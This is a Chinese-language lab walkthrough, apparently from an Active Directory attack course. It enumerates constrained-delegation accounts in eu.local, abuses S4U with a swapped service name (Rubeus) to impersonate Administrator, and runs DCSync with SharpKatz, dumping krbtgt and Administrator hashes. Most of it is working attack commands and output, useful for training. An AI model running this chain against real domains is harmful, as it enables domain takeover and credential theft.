Task
•  Enumerate users in the eu.local domain for whom Constrained Delegation is enabled.
•  Abuse the Delegation to execute DCSync attack against eu.local.

# Enumerate users in the eu.local domain for whom Constrained Delegation is enabled.

枚举eu.local里的约束委派机器，我们可以使用ActiveDirectory module

这里注意，从hands-on 20我们知道，US.TECHCORP.LOCAL（当前域）和EU.LOCAL（外域）是双向信任关系，这个是我们下面枚举能过成功的前提。有入站信任也可以成功枚举，但是只有出站信任则不能枚举。

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local


DistinguishedName        : CN=storagesvc,CN=Users,DC=eu,DC=local
msDS-AllowedToDelegateTo : {time/EU-DC.eu.local/eu.local, time/EU-DC.eu.local, time/EU-DC, time/EU-DC.eu.local/EU...}
Name                     : storagesvc
ObjectClass              : user
ObjectGUID               : 041fedb0-a442-4cdf-af34-6559480a2d74

```


# Abuse the Delegation to execute DCSync attack against eu.local.


因为在上一章中，我们已经有了storagesvc的命名密码

1. 根据密码，转成一个NTLM哈希

```
PS C:\Windows\system32> C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Calculate Password Hash(es)

[*] Input password             : Qwerty@123
[*] Input username             : storagesvc
[*] Input domain               : eu.local
[*] Salt                       : EU.LOCALstoragesvc
[*]       rc4_hmac             : 5C76877A9C454CDED58807C20C20AEAC
[*]       aes128_cts_hmac_sha1 : 4A5DDDB19CD631AEE9971FB40A8195B8
[*]       aes256_cts_hmac_sha1 : 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04
[*]       des_cbc_md5          : 7F7C6ED00258DC57
```

2. 使用上面生成的哈希，请求一个tgt，然后再模拟Administrator申请一个ldap服务，并且导入当前session

这里注意，本来委派的只是一个time/EU-DC.eu.local/eu.local服务，但是因为tgs中的服务名不受保护，可修改，这里另外申请了一个ldap服务


```
PS C:\Windows\system32> C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: S4U

[*] Using rc4_hmac hash: 5C76877A9C454CDED58807C20C20AEAC
[*] Building AS-REQ (w/ preauth) for: 'eu.local\storagesvc'
[*] Using domain controller: 192.168.12.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'storagesvc@EU.LOCAL'
[*] Using domain controller: eu-dc.eu.local (192.168.12.1)
[*] Sending S4U2self request to 192.168.12.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'storagesvc@EU.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'nmagent/eu-dc.eu.local'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'nmagent/eu-dc.eu.local'
[*] Using domain controller: eu-dc.eu.local (192.168.12.1)
[*] Sending S4U2proxy request to domain controller 192.168.12.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/eu-dc.eu.local':

      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
[+] Ticket successfully imported!
```


klist查看

```
PS C:\Windows\system32> klist

Current LogonId is 0:0xd530da

Cached Tickets: (1)

#0>     Client: Administrator @ EU.LOCAL
        Server: ldap/eu-dc.eu.local @ EU.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 11/4/2022 1:20:29 (local)
        End Time:   11/4/2022 11:20:29 (local)
        Renew Time: 11/11/2022 1:20:29 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

现在我们已经有了ldap服务的tgs，应该可以使用dcsync


krbtgt
```
PS C:\Windows\system32> C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] eu.local will be the domain
[!] eu-dc.eu.local will be the DC server
[!] eu\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/12/2019 11:00:04 PM
[*] Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : 83ac1bab3e98ce6ed70c9d5841341538
[*] ntlm- 0              : 83ac1bab3e98ce6ed70c9d5841341538
[*] lm  - 0              : bcb73c3d2b4005e405ff7399f3ca2bf0
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : a0c1c86edafc0218a106426f2309bafd
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :EU.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d
[*]     aes128_hmac       4096: e2ef89cdbd94d396f63c9aa5b66e16c7
[*]     des_cbc_md5       4096: 92371fe32c9ba208
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :EU.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 92371fe32c9ba208
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 bbd1d8cc9e5001a195c0aea8260dc460
[*]     02 a8a12e010ecbfa9772ffbf94a0c53bbf
[*]     03 5c4ea92171032c3655c6dab468555c1b
[*]     04 bbd1d8cc9e5001a195c0aea8260dc460
[*]     05 a8a12e010ecbfa9772ffbf94a0c53bbf
[*]     06 b0ebda7d1fa949eef7f3618fb745e92d
[*]     07 bbd1d8cc9e5001a195c0aea8260dc460
[*]     08 4f1dd1dc8c185043ea5f588bced2e536
[*]     09 4f1dd1dc8c185043ea5f588bced2e536
[*]     10 388e53f1b4fc51f5f2a046e9a03d15f8
[*]     11 7a7451acdbda7ca3ea2b9c29a5505805
[*]     12 4f1dd1dc8c185043ea5f588bced2e536
[*]     13 40fb8f21d6689dc78cfa977b8678fba0
[*]     14 7a7451acdbda7ca3ea2b9c29a5505805
[*]     15 8c35ff6c675fea1d7fa64405721aba20
[*]     16 8c35ff6c675fea1d7fa64405721aba20
[*]     17 63fb31e1ff838c848d1e0cbaed8c272e
[*]     18 4e60cf1107bbc98e8fbb76499de1dd96
[*]     19 035a4fe85f9cbe04af399507cd09d7eb
[*]     20 6c0a58bf772f0ce23496ac5dc68672f7
[*]     21 726b4122553e3a61b34c5e08ab04006e
[*]     22 726b4122553e3a61b34c5e08ab04006e
[*]     23 b65f6706fbb5f5e370b76c892cbf98dd
[*]     24 2e16efd1ddfe850f2b8f47ccdd5501ff
[*]     25 2e16efd1ddfe850f2b8f47ccdd5501ff
[*]     26 2afde765ea5c02b1a282f63d9a88ab45
[*]     27 756254f63a68f4f0cf34e82d11986474
[*]     28 50ab58d5ae45dc5792e1dc9d5f6945a5
[*]     29 1b252cf7a18c4e6fcceb388e0e2a0ef6
```

dump 出administrator哈希
```
PS C:\Windows\system32> C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] eu.local will be the domain
[!] eu-dc.eu.local will be the DC server
[!] eu\administrator will be the user account
[*]
[*] Object RDN           : Administrator
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : Administrator
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
[*] Account expiration   : 12/31/1600 4:00:00 PM
[*] Password last change : 7/12/2019 10:57:59 PM
[*] Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-500
[*] Object Relative ID   : 500
[*]
[*] Credents:
[*] Hash NTLM            : fe422f818eb7e9c6de5862d94739c2e4
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 5f7bd4f2ff28def5223962d35eef079d
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :EU-DCAdministrator
[*]     Credents
[*]     aes256_hmac       4096: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
[*]     aes128_hmac       4096: 977311408c382531f01b42d6a5906181
[*]     des_cbc_md5       4096: 23c7456de0644ccd
[*]     ServiceCredents
[*]     OldCredents
[*]     aes256_hmac       4096: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
[*]     aes128_hmac       4096: 977311408c382531f01b42d6a5906181
[*]     des_cbc_md5       4096: 23c7456de0644ccd
[*]     OlderCredents
[*]     aes256_hmac       4096: 0b9fc10a20274364bcb059db52f500bfa0b560eccf023720a847f686b8b3dd18
[*]     aes128_hmac       4096: 90e2e9a99a1d2ea77f75b7237370cd94
[*]     des_cbc_md5       4096: 860ba1b92f5b9b38
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :EU-DCAdministrator
[*]     Credents
[*]     des_cbc_md5       : 23c7456de0644ccd
[*]     OldCredents
[*]     des_cbc_md5       : 23c7456de0644ccd
[*]
```



## 也可以请求一个cifs服务
```
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:cifs /dc:eu-dc.eu.local /ptt
```

这样就可以遍历eu-dc的文件系统

```
PS C:\Windows\system32> ls \\eu-dc.eu.local\c$


    Directory: \\eu-dc.eu.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/7/2020   2:51 AM                PerfLogs
d-r---         1/6/2021  12:40 AM                Program Files
d-----         7/3/2019  10:00 AM                Program Files (x86)
d-r---        7/12/2019  10:44 PM                Users
d-----        5/22/2022   3:16 AM                Windows
```